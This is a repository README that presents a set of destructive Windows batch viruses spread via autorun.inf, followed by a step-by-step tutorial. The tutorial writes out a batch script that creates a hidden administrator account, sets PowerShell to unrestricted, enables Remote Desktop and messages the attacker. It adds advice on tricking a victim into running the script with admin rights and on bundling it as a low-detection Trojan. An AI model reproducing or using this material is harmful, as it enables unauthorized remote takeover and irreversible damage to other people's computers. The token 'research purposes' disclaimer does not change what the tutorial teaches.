# Malware

This is my first controbution! 
And because I want to give something meaningful as well as just mess around, this repo is a collection of fun little viruses that pack a mean punch.

If you know anything about hacking you will know that batch files are commonly the scum of the hacking world, most tutorials will show you how to make "viruses" that are nothing more than pranks and gain the creator nothing more than a laugh, which is OK, but if you really want something to cause some actual lasting damage those pranks will be no help. 

So here are a couple of actual batch file viruses included in this repo:
1. Disablenet.bat
2. Shutdowns.bat
3. crashespc.bat
4. system_meltdown.bat

Please Note that the above mentioned viruses make use of the  autorun.inf  file to exploit the autorun feature and can easily infect a windows machine and their effect can be devistating. 
Each .bat file can potencially destroy a PC if it's run individually. I have set them all to autorun, ensuring a non recoverable end result.

    Additionally!!

    For an additional virus that is unlinked and unaffiliated with the .bat set please see the file named:
    Complete_viruscode_Pascal: 

_____________________________________________________________________________________________________________________________


  Here Is a Short Tutorial! 
    Let's try to make an actual batch file virus to gain full access to another computer.
	    NOTE: The user is going to have to be tricked into opening a file that requires admin access.
			
The first step is to open notepad and type in: 

    @echo offnet user winsystem winsystem /addnet localgroup administrators winsystem /add powershell set-executionpolicy 

    unrestrictedpowershell $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' 

    powershell New-Item $path -Force | New-ItemProperty -Name winsystem -Value 0 -PropertyType DWord -Force reg add 

    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

    msg <insert your IP here> Its ready.
		
How it Works

   The first line creates a new user called winsystem with the password winsystem
   The second line adds the new user as an admin.
   The third line allows PowerShell scripts to run.
   The fourth and fifth lines hide the user from the Log in screen.
   The sixth line allows RDP (Remote Desktop Protocol) 
   The seventh line sends the IP address that is imputed the message "Its ready."
   Last step: 
   Download https://www.computerhope.com/download/utility/Bat_To_Exe_Converter.zip then convert the batch file and remember to tick the box that says Add Administrator Manifest.

REMEMBER: When the box opens DO NOT CLOSE IT! Copy down the computer name, open cmd, and type: ping <the computer name you copied down>.

Thats all! As soon as you get the IP, Copy it and input it into RDP and log in as winsystem.

NOTE: Replace the items in < > as the items specified (duh).
		
This may be detected by antivirus, but if you join the regular .bat file with a different file a Trojan can be made with low detection rates.
		
Remember that all responsibilities are at your own risk.
Please use it only for research purposes. Do not download this!

Be careful not to infect yourself when accessing and experimenting with malicious software!
